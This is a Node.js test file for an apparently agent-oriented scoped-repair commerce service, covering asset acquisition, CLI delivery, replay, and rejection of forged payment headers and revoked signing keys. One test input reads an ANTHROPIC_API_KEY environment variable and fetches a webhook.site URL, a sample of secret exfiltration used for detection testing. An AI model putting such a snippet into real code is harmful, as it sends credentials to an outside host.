import test from 'node:test';
import assert from 'node:assert/strict';
import { createHash, generateKeyPairSync } from 'node:crypto';
import { spawnSync } from 'node:child_process';
import { mkdtemp, mkdir, readFile, writeFile, rm } from 'node:fs/promises';
import { tmpdir } from 'node:os';
import path from 'node:path';
import express from 'express';
import { authorizePlan, authorizeExecution, verifyAuthorization } from 'agent-payment-policy';
import { surface, seller, target, service, quoteIntent, NOW } from '../../../task-linked-delivery/experiments/scoped-repair-commerce-100348/test/support.mjs';
import { acceptanceAction } from '../../../task-linked-delivery/experiments/scoped-repair-commerce-100348/src/contracts.mjs';
import { mountScopedRepairCommerce } from '../../../task-linked-delivery/experiments/scoped-repair-commerce-100348/route/mount.mjs';
import { unpaidOffer } from '../../../task-linked-delivery/experiments/scoped-repair-commerce-100348/test/merchant.mjs';
import { processRun } from '../../../task-linked-delivery/experiments/scoped-repair-commerce-100348/test/process.mjs';
import { startMerchant, ROOT } from './merchant-helper.mjs';

const hash = bytes => createHash('sha256').update(bytes).digest('hex');
const prefix = '/commerce/scoped-repair/';
async function post(base, command, input, extra = {}) {
  const response = await fetch(base + prefix + command, { method: 'POST',
    headers: { 'content-type': 'application/json', ...extra }, body: JSON.stringify(input),
    redirect: 'error', signal: AbortSignal.timeout(5000) });
  const bytes = Buffer.from(await response.arrayBuffer()); assert.ok(bytes.length <= 16384);
  assert.equal(response.headers.get('payment-required'), null);
  assert.equal(response.headers.get('payment-response'), null);
  return { status: response.status, body: JSON.parse(bytes) };
}

test('actual merchant acquisition supplies two stripped CLI tasks, free diagnosis, negative, decline, changed later input and restart', async t => {
  const root = await mkdtemp(path.join(tmpdir(), 'sol398-received-')); t.after(() => rm(root, { recursive: true, force: true }));
  const packetDir = path.join(root, 'packets'); let real = await startMerchant(packetDir); t.after(() => real.close());
  const manifest = JSON.parse(await readFile(path.join(ROOT, 'public-acquisition/manifest.json')));
  const clientAssets = manifest.assets.filter(x => x.id === 'scoped-repair-commerce-100348');
  assert.equal(clientAssets.length, 4);
  const index = await fetch(real.base + '/.well-known/public-acquisition/index.json');
  assert.equal(index.status, 200); const announced = await index.json();
  assert.equal(announced.productionHosted, false); assert.equal(announced.hostedAcquisitionVerified, false);
  let archive;
  for (const asset of clientAssets) {
    const url = real.base + '/.well-known/public-acquisition/assets/' + asset.relativePath;
    const head = await fetch(url, { method: 'HEAD', redirect: 'error', signal: AbortSignal.timeout(1000) });
    assert.equal(head.status, 200); assert.equal(head.headers.get('content-length'), String(asset.bytes));
    assert.equal((await head.arrayBuffer()).byteLength, 0);
    const got = await fetch(url, { redirect: 'error', signal: AbortSignal.timeout(1000) });
    assert.equal(got.status, 200); const bytes = Buffer.from(await got.arrayBuffer());
    assert.equal(bytes.length, asset.bytes); assert.equal(hash(bytes), asset.sha256);
    assert.equal(asset.hostedAcquisitionVerified, false);
    if (asset.role === 'archive') { archive = path.join(root, 'client.tar.gz'); await writeFile(archive, bytes); }
  }
  const one = path.join(root, 'first'), two = path.join(root, 'restart');
  for (const dir of [one, two]) {
    await mkdir(dir); assert.equal(spawnSync('tar', ['-xzf', archive, '-C', dir], { timeout: 2000 }).status, 0);
    const cold = await processRun(['bin/check-cold.mjs'], { cwd: dir }); assert.equal(cold.code, 0);
    assert.equal(JSON.parse(cold.out).executed, false);
  }
  const cli = async (dir, command, input) => {
    const run = await processRun(['bin/scoped-repair.mjs', command, '--service', real.base, '--request', '-'],
      { cwd: dir, stdin: JSON.stringify(input), deadline: 6000 });
    assert.equal(run.code, 0, run.err || run.out); return JSON.parse(run.out);
  };
  const sdk = surface({ id: 'caller-sdk-concern' });
  sdk.task.statement = 'Clear rule:env-exfil in this caller-named MCP SDK integration and retest only the supplied source bytes.';
  sdk.input.files[0].path = 'caller-sdk.mjs'; sdk.fix.request.files[0].path = 'caller-sdk.mjs';
  sdk.operation.body = structuredClone(sdk.input);
  const direct = await fetch(real.base + '/commerce/scoped-surface-scan', { method: 'POST',
    headers: { 'content-type': 'application/json' }, body: JSON.stringify(sdk.input), signal: AbortSignal.timeout(5000) });
  assert.equal(direct.status, 200); const free = await direct.json();
  assert.equal(free.paymentPerformed, false); assert.equal(free.report.concern.result, 'match');
  const first = await cli(one, 'deliver', sdk);
  assert.deepEqual(first.packet.baseline.report.findings, free.report.findings);
  assert.equal(first.packet.acceptanceResult.passed, true); assert.equal(first.persistence, 'local_readback');
  const before = await target(null), after = await target(true); t.after(before.close); t.after(after.close);
  const output = seller(before.base, after.base);
  const delivered = await cli(one, 'deliver', output);
  assert.equal(delivered.packet.baseline.classification.reason, 'body_contradicts_declaration');
  assert.equal(delivered.packet.observed.retest.changedOutput.before, null);
  assert.equal(delivered.packet.observed.retest.changedOutput.after, true);
  assert.equal(delivered.packet.acceptanceResult.passed, true);
  const diagnosis = await fetch(real.base + '/commerce/seller-repair-diagnosis', { method: 'POST', headers: { 'content-type': 'application/json' },
    body: JSON.stringify({ callerId: output.task.callerId, task: output.task.statement, origin: output.input.origin,
      operation: output.input.operation, sdk: output.input.sdk, runtime: output.input.runtime, expect: output.input.expect,
      probe: false, observed: { status: 200, json: { result: {} } } }), signal: AbortSignal.timeout(2000) });
  const diagnosed = await diagnosis.json(); assert.equal(diagnosis.status, 200, diagnosed.error);
  assert.equal(diagnosed.paymentSent, false); assert.equal(diagnosed.observation.independentlyObserved, false);
  const negative = await cli(one, 'deliver', surface({ id: 'caller-missing-fix', fix: false }));
  assert.equal(negative.packet.acceptanceResult.passed, false);
  const review = await cli(one, 'review', { packetId: negative.packet.packetId, taskId: 'caller-missing-fix', callerId: 'caller-a', claimantUseful: true });
  assert.equal(review.claimantOutcome.state, 'contradicted_by_observed_work');
  const declined = await cli(one, 'accept', { packetId: first.packet.packetId, taskId: sdk.task.id, callerId: sdk.task.callerId, decision: 'declined' });
  assert.equal(declined.acceptance.reason, 'claimant_declined');
  const changed = structuredClone(sdk); changed.terms.version = 'later-v2'; changed.fix.request.files[0].text = 'const k=process.env.ANTHROPIC_API_KEY;\nfetch("https://webhook.site/later");\n';
  const later = await cli(two, 'reuse', { packetId: first.packet.packetId, request: changed });
  assert.equal(later.applicability, 'changed_input_requires_fresh_execution'); assert.equal(later.current.acceptanceResult.passed, false);
  assert.equal(later.paymentInherited, false);
  const stored = await readFile(path.join(packetDir, 'scoped-repair-packets.ndjson'));
  const firstCalls = { ...real.calls }; await real.close(); real = await startMerchant(packetDir);
  const retry = await cli(two, 'deliver', sdk); assert.equal(retry.replay, true); assert.equal(retry.packet.packetId, first.packet.packetId);
  assert.deepEqual(await readFile(path.join(packetDir, 'scoped-repair-packets.ndjson')), stored);
  const conflict = await post(real.base, 'deliver', { ...sdk, terms: { ...sdk.terms, version: 'changed-v3' } });
  assert.equal(conflict.status, 409); assert.equal(conflict.body.reason, 'request_binding_changed');
  assert.deepEqual(firstCalls, { verify: 0, settle: 0 }); assert.deepEqual(real.calls, { verify: 0, settle: 0 });
  if (process.env.SOL398_MOUNT_RECEIPT) await writeFile(process.env.SOL398_MOUNT_RECEIPT, JSON.stringify({
    schema: 'sol398.mounted-receiving.v1', proofClass: 'loopback', clientSha256: hash(await readFile(archive)),
    receivedAssets: clientAssets.map(({ relativePath, bytes, sha256 }) => ({ relativePath, bytes, sha256 })),
    strippedRoots: 2, tasks: [first, delivered].map(r => ({ task: r.packet.binding.task.id, passed: r.packet.acceptanceResult.passed, executionMs: r.packet.effort.executionMs })),
    actualMerchant: true, actualFreeScanner: true, suppliedSellerEvidenceIsIndependent: false,
    usefulNegative: true, decline: true, changedLater: true, restartedRetry: true, unchangedStoreOnRetry: true,
    verifyCalls: firstCalls.verify + real.calls.verify, settleCalls: firstCalls.settle + real.calls.settle,
    productionHosted: false, outsideUse: 'unknown', settlement: 'unknown', recognizedRevenueAtomic: '0',
  }, null, 2) + '\n');
});

test('mounted raw intake and hostile payment headers cannot grant authority or reach verification/settlement', async t => {
  const dir = await mkdtemp(path.join(tmpdir(), 'sol398-payment-')); t.after(() => rm(dir, { recursive: true, force: true }));
  const real = await startMerchant(path.join(dir, 'packets')); t.after(real.close);
  const headers = { 'payment-signature': 'forged-owner-qa', 'x-payment': 'forged-owner-qa', authorization: 'Payment forged-owner-qa' };
  const clean = await post(real.base, 'deliver', surface({ id: 'hostile-headers', clean: true, fix: false }), headers);
  assert.equal(clean.status, 200); assert.equal(clean.body.packet.qualification.state, 'free_already_sufficient');
  assert.equal(clean.body.packet.quote.authorized, false);
  const accept = { packetId: clean.body.packet.packetId, taskId: 'hostile-headers', callerId: 'caller-a', decision: 'accepted',
    paymentAuthorized: true, settled: true, authorization: { authorized: true }, executionAuthorization: { authorized: true } };
  const refusal = await post(real.base, 'accept', accept, headers);
  assert.equal(refusal.body.acceptance.reason, 'acceptance_authority_unavailable'); assert.equal(refusal.body.acceptance.authorized, false);
  const invalid = surface({ id: 'seeded-paid-authority' }); invalid.paymentAuthorized = true;
  assert.equal((await post(real.base, 'deliver', invalid, headers)).status, 400);
  const oversized = surface({ id: 'oversized-intake' }); oversized.input.files[0].text = 'x'.repeat(530000);
  const capped = await post(real.base, 'deliver', oversized, headers);
  assert.equal(capped.status, 400); assert.equal(capped.body.reason, 'input_bytes_exceeded');
  const expired = await post(real.base, 'deliver', surface({ id: 'past-deadline' }), { ...headers, 'x-scoped-deadline-at': String(Date.now() - 1) });
  assert.equal(expired.status, 400); assert.equal(expired.body.reason, 'deadline_exceeded');
  const challenge = await fetch(real.base + '/commerce/seller-integrity-audit?origin=https%3A%2F%2Fintegration.example&route=%2Fstatus', { signal: AbortSignal.timeout(2000) });
  assert.equal(challenge.status, 402); assert.ok(challenge.headers.get('payment-required'));
  assert.deepEqual(real.calls, { verify: 0, settle: 0 });
});

test('signed acceptance is read-only, rechecks current merchant terms and respects removed trusted caller rights', async t => {
  const dir = await mkdtemp(path.join(tmpdir(), 'sol398-authority-')); t.after(() => rm(dir, { recursive: true, force: true }));
  const real = await startMerchant(path.join(dir, 'packets')); t.after(real.close);
  const before = await target(null), after = await target(true); t.after(before.close); t.after(after.close);
  const keys = generateKeyPairSync('ed25519'), publicKeys = new Map([['caller-b', keys.publicKey]]); let changed = null;
  const env = await service({ publicKeys, offerFor: async ({ url, budget }) => ({
    ...await unpaidOffer(real.base, url, budget, { expiresAt: new Date(NOW + 180000).toISOString() }), ...changed,
  }) }); t.after(env.close);
  const app = express(); mountScopedRepairCommerce(app, { store: env.store, ...{ publicKeys }, now: () => NOW,
    offerFor: async ({ url, budget }) => ({ ...await unpaidOffer(real.base, url, budget, { expiresAt: new Date(NOW + 180000).toISOString() }), ...changed }) });
  const host = app.listen(0, '127.0.0.1'); await new Promise(resolve => host.once('listening', resolve));
  t.after(() => new Promise(resolve => host.close(resolve))); const base = 'http://127.0.0.1:' + host.address().port;
  const request = seller(before.base, after.base); request.quoteIntent = quoteIntent();
  const { packet } = (await post(base, 'deliver', request)).body;
  assert.equal(packet.quote.status, 'candidate');
  const authorization = authorizePlan(packet.quote.plan, { privateKey: keys.privateKey, kid: 'disposable-owner-qa', now: NOW, ttlMs: 120000 });
  const verified = verifyAuthorization(authorization, { publicKey: keys.publicKey, plan: packet.quote.plan, now: NOW });
  const executionAuthorization = authorizeExecution({ authorization: verified, method: 'accept_delivery', network: packet.quote.plan.selected.network,
    action: acceptanceAction(packet) }, { privateKey: keys.privateKey, kid: 'disposable-owner-qa', now: NOW, ttlMs: 120000 });
  const command = { packetId: packet.packetId, taskId: request.task.id, callerId: request.task.callerId, decision: 'accepted', authorization, executionAuthorization };
  const original = await readFile(path.join(env.dir, 'scoped-repair-packets.ndjson'));
  for (let i = 0; i < 2; i++) {
    const response = await post(base, 'accept', command); assert.equal(response.body.acceptance.authorized, true);
    assert.equal(response.body.acceptance.executionPermittedByPackage, false); assert.equal(response.body.paymentPerformed, false);
    assert.equal(response.body.acceptance.additionalImplementationAuthorized, false);
  }
  changed = { amountAtomic: '20000' };
  assert.equal((await post(base, 'accept', command)).body.acceptance.reason, 'current_terms_changed'); changed = null;
  publicKeys.delete('caller-b');
  assert.equal((await post(base, 'accept', command)).body.acceptance.reason, 'acceptance_authority_unavailable');
  assert.deepEqual(await readFile(path.join(env.dir, 'scoped-repair-packets.ndjson')), original);
  assert.deepEqual(real.calls, { verify: 0, settle: 0 });
});
